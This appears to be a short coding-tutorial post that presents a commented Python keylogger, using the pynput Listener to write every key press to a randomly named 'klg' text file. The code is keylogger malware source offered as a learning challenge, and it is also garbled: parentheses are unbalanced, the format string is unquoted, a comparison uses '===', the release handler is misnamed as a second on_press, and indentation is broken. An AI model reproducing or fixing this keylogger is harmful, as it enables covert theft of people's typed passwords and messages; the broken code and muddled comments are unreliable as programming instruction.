Coding challenges from Basic to advanced


from random import randint
#randint is a random integer- function that generates a random number
from pynput.keyboard import Key, Listener
##Pynput- module we downloaded from Github to use Key and Listener

output='klg'+str(randint(0,1000)+'.txt'
#file name  programmed to be named ‘klg’ with random integer number from 0 to 1000, and to be saved as a text file
with open(output, 'w') as f:
# with open function opens a file or creates a file handler
f.close()
#close function to close the handler

def on_press(key):
#function on_press is used to detect and control input devices, mouse and keyboard
  with open(output,'a')as f:
  #we open the file (output) as where the data will be stored
     f.write({0}pressed\n.format(key)
#as file is open we use function f.write
#{0}that’s where the key is gonna be formatted when pressed
#command \n make a new line after a keyboard is pressed
#.format(key) is used to add they key to the beginning of the string
     f.close()
#f.close function to close the file handler

#Then we do exactly opposite and use condition on_release, the method is used to identify when the button is released

def on_press(key):
   with open(output,'a')as f:
      f.write({0}pressed\n.format(key)
      f.close()
  if key===key.esc
 # if key is equal to Escape
   return False

with Listener(on_press=on_press) as Listener:
    Listener.join()
# Listener listens for spacebar, arrow, shift keys on press
# listener.join() remove if main thread is polling self.keys
